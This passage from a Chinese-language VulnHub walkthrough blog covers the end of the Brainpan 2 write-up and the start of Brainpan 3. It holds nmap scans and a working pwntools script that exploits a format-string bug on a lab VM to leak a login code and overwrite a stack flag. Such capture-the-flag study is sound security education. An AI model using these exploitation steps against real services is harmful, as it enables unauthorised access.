-la</span><br><span class="line">total 32</span><br><span class="line">drwx------ 5 puck  puck   4096 Feb  2 23:23 .</span><br><span class="line">drwxr-xr-x 5 root  root   4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck   4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck      0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck    220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck   3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck    675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  anansi 4096 Nov  4  2013 .ssh</span><br><span class="line">drwx------ 2 puck  puck   4096 Nov  5  2013 .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">ssh: connect to host brainpan2 port 22: Connection refused</span><br></pre></td></tr></table></figure>

<p>看看ssh是否没有运行或在其他端口上运行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line"><span class="comment"># Package generated configuration file</span></span><br><span class="line"><span class="comment"># See the sshd_config(5) manpage for details</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># What ports, IPs and protocols we listen for</span></span><br><span class="line">Port 2222</span><br><span class="line"><span class="comment"># Use these options to restrict which interfaces/protocols sshd will bind to</span></span><br><span class="line"><span class="comment">#ListenAddress ::</span></span><br><span class="line"><span class="comment">#ListenAddress 0.0.0.0</span></span><br><span class="line">ListenAddress 127.0.1.1</span><br><span class="line">Protocol 2</span><br><span class="line"><span class="comment"># HostKeys for protocol version 2</span></span><br><span class="line">HostKey /etc/ssh/ssh_host_rsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_dsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line"><span class="comment">#Privilege Separation is turned on for security</span></span><br><span class="line">UsePrivilegeSeparation yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lifetime and size of ephemeral version 1 server key</span></span><br><span class="line">KeyRegenerationInterval 3600</span><br><span class="line">ServerKeyBits 768</span><br><span class="line"></span><br><span class="line"><span class="comment"># Logging</span></span><br><span class="line">SyslogFacility AUTH</span><br><span class="line">LogLevel INFO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Authentication:</span></span><br><span class="line">LoginGraceTime 120</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">StrictModes yes</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"><span class="comment">#AuthorizedKeysFile     %h/.ssh/authorized_keys</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t read the user&#x27;s ~/.rhosts and ~/.shosts files</span></span><br><span class="line">IgnoreRhosts yes</span><br><span class="line"><span class="comment"># For this to work you will also need host keys in /etc/ssh_known_hosts</span></span><br><span class="line">RhostsRSAAuthentication no</span><br><span class="line"><span class="comment"># similar for protocol version 2</span></span><br><span class="line">HostbasedAuthentication no</span><br><span class="line"><span class="comment"># Uncomment if you don&#x27;t trust ~/.ssh/known_hosts for RhostsRSAAuthentication</span></span><br><span class="line"><span class="comment">#IgnoreUserKnownHosts yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># To enable empty passwords, change to yes (NOT RECOMMENDED)</span></span><br><span class="line">PermitEmptyPasswords no</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change to yes to enable challenge-response passwords (beware issues with</span></span><br><span class="line"><span class="comment"># some PAM modules and threads)</span></span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change to no to disable tunnelled clear text passwords</span></span><br><span class="line"><span class="comment">#PasswordAuthentication yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Kerberos options</span></span><br><span class="line"><span class="comment">#KerberosAuthentication no</span></span><br><span class="line"><span class="comment">#KerberosGetAFSToken no</span></span><br><span class="line"><span class="comment">#KerberosOrLocalPasswd yes</span></span><br><span class="line"><span class="comment">#KerberosTicketCleanup yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># GSSAPI options</span></span><br><span class="line"><span class="comment">#GSSAPIAuthentication no</span></span><br><span class="line"><span class="comment">#GSSAPICleanupCredentials yes</span></span><br><span class="line"></span><br><span class="line">X11Forwarding yes</span><br><span class="line">X11DisplayOffset 10</span><br><span class="line">PrintMotd no</span><br><span class="line">PrintLastLog yes</span><br><span class="line">TCPKeepAlive yes</span><br><span class="line"><span class="comment">#UseLogin no</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#MaxStartups 10:30:60</span></span><br><span class="line"><span class="comment">#Banner /etc/issue.net</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow client to pass locale environment variables</span></span><br><span class="line">AcceptEnv LANG LC_*</span><br><span class="line"></span><br><span class="line">Subsystem sftp /usr/lib/openssh/sftp-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set this to &#x27;yes&#x27; to enable PAM authentication, account processing,</span></span><br><span class="line"><span class="comment"># and session processing. If this is enabled, PAM authentication will</span></span><br><span class="line"><span class="comment"># be allowed through the ChallengeResponseAuthentication and</span></span><br><span class="line"><span class="comment"># PasswordAuthentication.  Depending on your PAM configuration,</span></span><br><span class="line"><span class="comment"># PAM authentication via ChallengeResponseAuthentication may bypass</span></span><br><span class="line"><span class="comment"># the setting of &quot;PermitRootLogin without-password&quot;.</span></span><br><span class="line"><span class="comment"># If you just want the PAM account and session checks to run without</span></span><br><span class="line"><span class="comment"># PAM authentication, then enable this but set PasswordAuthentication</span></span><br><span class="line"><span class="comment"># and ChallengeResponseAuthentication to &#x27;no&#x27;.</span></span><br><span class="line">UsePAM yes</span><br></pre></td></tr></table></figure>

<p>最后终于成功连接ssh并且找到了flag，过程虽然没有太多很难的知识点，但是真够复杂的，不愧被称为brainpan!!!</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ ssh -l <span class="string">&quot;root &quot;</span> brainpan2 -p 2222</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2 -p 2222</span><br><span class="line">The authenticity of host <span class="string">&#x27;[brainpan2]:2222 ([127.0.1.1]:2222)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is 0a:15:1c:1c:25:b0:fe:54:8a:35:45:e5:b8:02:97:1a.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[brainpan2]:2222<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">Last login: Thu Nov  7 11:00:06 2013</span></span><br><span class="line"><span class="string">root @brainpan2:~# id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root ) gid=0(root ) groups=0(root )</span></span><br><span class="line"><span class="string">root @brainpan2:~# whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root </span></span><br><span class="line"><span class="string">root @brainpan2:~# cd /root</span></span><br><span class="line"><span class="string">cd /root</span></span><br><span class="line"><span class="string">root @brainpan2:/root# ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">flag.txt  whatif.txt</span></span><br><span class="line"><span class="string">root @brainpan2:/root# cat flag.txt</span></span><br><span class="line"><span class="string">cat flag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                          !!! CONGRATULATIONS !!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                 You&#x27;</span>ve completed the Brainpan 2 challenge! </span><br><span class="line">                 Or have you...? </span><br><span class="line"></span><br><span class="line">                 Yes, you have! Pat yourself on the back. :-)</span><br><span class="line"></span><br><span class="line">                 Questions, comments, suggestions <span class="keyword">for</span> new VM</span><br><span class="line">                 challenges? Let me know! </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                 Twitter: @superkojiman</span><br><span class="line">                 Email  : contact@techorganic.com</span><br><span class="line">                 Web    : http://www.techorganic.com</span><br><span class="line"></span><br><span class="line">root @brainpan2:/root<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub200.jpg"></p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>popen()执行多个命令获取shell</li>
<li>gdb调试寻找缓冲区溢出的地址</li>
<li>msfvenom生成shellcode配合ebp-8的地址0x0804a008进行缓冲区溢出提权</li>
<li>更换成ssh备份的私匙，连接具有root权限的ssh</li>
<li>.bash_history中的ssh连接历史中ssh密码泄露</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[brainpan-3]</title>
    <url>/2020/02/03/brainpan-3/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：brainpan：3<br>发行日期：2015年7月27日</p>
<h3 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h3><ul>
<li>万劫不复地狱难度</li>
</ul>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjMuemlw">https://download.vulnhub.com/brainpan/brainpan3.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjMuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/brainpan/brainpan3.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>免责声明<br>使用此虚拟机，即表示您同意，我对任何损失或损害不承担任何责任，包括但不限于间接或间接损失或损害，或由于或来自于此而产生的数据或利润损失而造成的任何损失或损害。与使用此软件的连接。TL; DR：如果发生坏事，这不是我的错。</p>
<p>设定<br>Brainpan 3经过测试，发现可与VMware Player，VMware Fusion和Virtual Box一起使用。<br>检查并确保Brainpan_III.ova具有以下校验和，以便您知道下载的文件是否完整：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5：170e0d8b26ab721587537fcde69087a0SHA1：ed9ae53c556a1ce6988b3a54621dd6469c8b8aa5</span><br></pre></td></tr></table></figure>

<p>将Brainpan_III.ova导入到您首选的管理程序中，并根据需要配置网络设置。它会通过DHCP获得IP地址，但是建议您在NAT内运行它，或者仅对主机OS可见，因为它容易受到攻击。</p>
<p>目标<br>root机器并获取flag。</p>
<ul>
<li>barrebas : <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9iYXJyZWJhcw==">https://twitter.com/barrebas<i class="fa fa-external-link-alt"></i></span></li>
<li>Swappage : <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9Td2FwcGFnZQ==">https://twitter.com/Swappage<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.117</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">MAC Address: 08:00:27:90:21:26 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -v -sV -Pn -p- 192.168.56.117 --system-dns</span></span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">1337/tcp open   waste?</span><br><span class="line">8080/tcp closed http-proxy</span><br></pre></td></tr></table></figure>

<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>找到端口1337后，可以开始使用Brainpan3。可以设置一个小的脚本来轻松地与服务器交互：</p>
<p>bp3.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>即使文字说</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>最初的想法是，“太酷了，四位数，Go Go Gadget Brute Force！”。原来，不是在撒谎。经过3次尝试，这个数字确实改变了。</p>
<p>一个登录提示，可以尝试使输入缓冲区溢出，以尝试产生堆栈溢出。这种方法的问题在于，溢出后没有二进制文件可以进行分析。最有意义的漏洞利用是格式字符串。来一些格式字符串试试！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|</span><br><span class="line">  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | </span><br><span class="line">  |   |  __ &lt;    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | </span><br><span class="line"> ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|</span><br><span class="line"></span><br><span class="line">                                                            by superkojiman</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br><span class="line"></span><br><span class="line">ACCESS CODE: $ %x.%x.%x.%x.%x.</span><br><span class="line">ERROR <span class="comment">#4: WHAT IS THIS, AMATEUR HOUR?</span></span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 1</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>Herm ..是否在％x上进行过滤？尝试其他格式的字符串。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: $ %p.%p.%p.%p.</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: 0xbf8a439c.(nil).0x22dd.0xbf8a439c.</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 2</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>现在知道此输入容易受到恶意格式字符串的攻击。由于正在寻找一个4位数的访问代码，因此可以假定它可能存储在堆栈中。尝试使用％d。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: $ %d.%d.%d.%d.%d.%d.</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: -1081457764.0.4625.-1081457764.0.10.</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 3</span><br><span class="line"></span><br><span class="line">BRUTE-FORCE ATTEMPT DETECTED</span><br><span class="line">PLEASE USE THE NEW CODE DISPLAYED ON YOUR ACCESS TOKEN</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>啊!这里的第三个数是什么：4625,尝试一下访问代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: $ 4625</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: ID-7034</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>进来了！在继续进行之前，修改脚本以自动跳过访问代码：</p>
<ul>
<li>发送%d.%d.%d.%d.%d.%d</li>
<li>提取第三个元素（访问代码）</li>
<li>提交访问代码以进行登录</li>
</ul>
<p>从这里开始，将继续向脚本中添加代码片段,结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 8695</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: ID-4373</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND: $</span><br></pre></td></tr></table></figure>

<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>现在已经登录，可以做更多的探索。看，已经使用Command 4获得了一个Shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 4</span><br><span class="line">SELECTED: 4</span><br><span class="line">reynard@brainpan3 $ $ ls</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r-- 1 reynard reynard 22 May 10 22:26 .flag</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 give</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 up</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 <span class="built_in">let</span></span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down</span><br></pre></td></tr></table></figure>

<p>当然，可以尝试溢出此shell脚本/二进制文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reynard@brainpan3 $ $ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">*** stack smashing detected ***: ./shell terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>

<p>经过更多尝试使用典型的recon命令whoami，uname -a等的探索，可以得出结论，该shell是无用的。尝试其他选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 1</span><br><span class="line">SELECTED: 1</span><br><span class="line">REPORT MODE IS DISABLED IN THIS BUILD</span><br><span class="line"></span><br><span class="line">SELECTED: 2</span><br><span class="line"></span><br><span class="line">CODE REPOSITORY IS NOW AVAILABLE</span><br></pre></td></tr></table></figure>

<p>看起来report模式当前处于禁用状态。可以尝试打开report，但是要怎么打开？</p>
<p>打开REPOSITORY，在端口8080上启用Web服务，该端口还具有/repo目录，其中包含在此步骤中使用的二进制文件：</p>
<p><img src="http://ctfhacker.com/assets/images/repo-directory.png"></p>
<p>花一些时间了解这些二进制文件是如何工作的，但最终没有任何有用的东西。这里是否存在其他漏洞。</p>
<p>尚未查看的最后一个功能是“Update Session Name”功能：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: $ fuckfuckfuckfuck</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: fuckfuckfuckfuck</span><br></pre></td></tr></table></figure>

<p>有趣的是，可以从访问代码中使用会话名称复制字符串格式漏洞吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: $ %p.%p.%p.%p.%p.</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: 0xbfcfddcc.0x104.0x252e7025.0x70252e70.0x2e70252e.</span><br></pre></td></tr></table></figure>

<p>可以。丢弃堆栈中的很大一部分，看看有什么。发送70个％x。请注意，仅在末尾添加句点，以便更轻松地拆分结果字符串。这样可以使各个格式字符串与其输出之间的关联更加容易。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: $ %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: bfcfddcc.104.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.ff0a2e78.b76d9c20.bfcfdf1c.0.b76d9000.b76d9ac0.b76da898.b752d940.b759f0b5.b76d9ac0.59.4e.59.b76d98a0.b76d9000.b76d9ac0.</span><br><span class="line">\xff \x9cm\xb7\x1cϿ</span><br></pre></td></tr></table></figure>

<p>在这里，正在研究很多重复的值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; unhex(<span class="string">&#x27;252e7825&#x27;</span>)[::-1]</span><br><span class="line"><span class="string">&#x27;%x.%&#x27;</span></span><br></pre></td></tr></table></figure>

<p>看起来那些重复的字符是格式字符串缓冲区。此格式字符串中有一个有趣的段：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python</span></span><br><span class="line">Python 2.7.17 (default, Jan 19 2020, 19:54:54) </span><br><span class="line">[GCC 9.2.1 20200110] on linux2</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">&#x27;b76d9ac0.59.4e.59.b76d98a0.b76d9000.b76d9ac0.&#x27;</span>.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">...   unhex(item)</span><br><span class="line">... </span><br><span class="line"><span class="string">&#x27;\xb7m\x9a\xc0&#x27;</span></span><br><span class="line"><span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="string">&#x27;N&#x27;</span></span><br><span class="line"><span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="string">&#x27;\xb7m\x98\xa0&#x27;</span></span><br><span class="line"><span class="string">&#x27;\xb7m\x90\x00&#x27;</span></span><br><span class="line"><span class="string">&#x27;\xb7m\x9a\xc0&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Y，N，Y看起来非常类似于命令菜单中显示的对话框的Y，N，Y。可以尝试在Y，N，Y上写一个缓冲区，使其变为Y，Y，Y吗？抓住4e在格式字符串中的哪个位置，以便知道有多少溢出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行上面的脚本，注意，report现在出现了[Y]！nice！。看看如何处理report。</p>
